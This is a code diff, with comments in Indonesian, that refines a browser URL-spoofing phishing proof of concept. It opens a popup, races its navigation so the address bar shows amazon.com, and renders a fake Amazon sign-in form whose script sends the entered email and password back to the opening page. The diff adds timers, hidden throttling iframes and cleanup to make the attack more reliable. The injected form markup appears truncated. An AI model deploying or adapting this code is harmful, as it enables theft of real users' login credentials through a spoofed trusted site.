@@ -1,4 +1,5 @@
-<a id=test href="https://www.amazon.com/" onclick=foo()>Login width Amazon</a>
+<body>
+  <a id=test href="https://www.amazon.com/" onclick=foo()>Login width Amazon</a>
   </body>
   
   <script>
@@ -6,6 +7,18 @@
   var w;
   var t;
   var z;
+  var frames = [];   // simpan iframe slow() agar bisa dibersihkan
+  var guard;         // watchdog: pastikan timer & iframe berhenti
+  var SLOW_FRAMES = 0;   // jumlah iframe perlambat race; tuning di device (0 = matikan slow)
+
+  //hapus iframe slow() + hentikan interval (bebaskan resource -> form tidak freeze)
+  function cleanup(){
+  clearInterval(z);
+  for (var i=0; i<frames.length; i++){
+  if(frames[i] && frames[i].parentNode){ frames[i].parentNode.removeChild(frames[i]); }
+  }
+  frames = [];
+  }
   
   if(location.href.indexOf("fake") !== -1){
   document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
@@ -15,7 +28,64 @@
   function foo(){
   
   document.getElementById("test").href="#";
+  
   w = window.open("?fake");
+  
+  t = setInterval('bar()',1);
+  
+  }
+  
+  function bar(){
+  
+  if(w.location.href !== 'about:blank'){
+  
+  document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
+  
+  slow();
+  
+  w.location.href = 'https://www.amazon.com/';
+  
+  clearInterval(t);
+  
+  z = setInterval('baz()',1);
+
+  //watchdog: kalau exception cross-origin tak pernah terlempar,
+  //tetap hentikan interval 1ms & buang iframe agar form tidak beku selamanya
+  guard = setTimeout(cleanup, 1500);
+
+  }
+
+  }
+  
+  function baz(){
+  try{
+  w.location.href !== 'about:blank';
+  }
+  catch (e){
+  
+  //stop page loading
+  w.location.href='https://www.google.com/csi';
+  clearTimeout(guard);
+  cleanup();   //hentikan interval + buang 10 iframe amazon (penyebab freeze)
+  
+  //Make sure the old content is not cleared
+  setTimeout("window.location.href='about:blank';window.close();", 3000);
+  }
+  
+  }
+  
+  
+  //slow down the website
+  function slow() {
+  for (i=0; i<SLOW_FRAMES; i++ ) {
+  
+  iframe = document.createElement("iframe");
+  iframe.src = 'https://www.amazon.com/';
+  iframe.style = 'display:none';
+  document.body.appendChild(iframe);
+  frames.push(iframe);   //catat agar bisa dibuang saat cleanup()
+
+  }
   }
   
   </script>
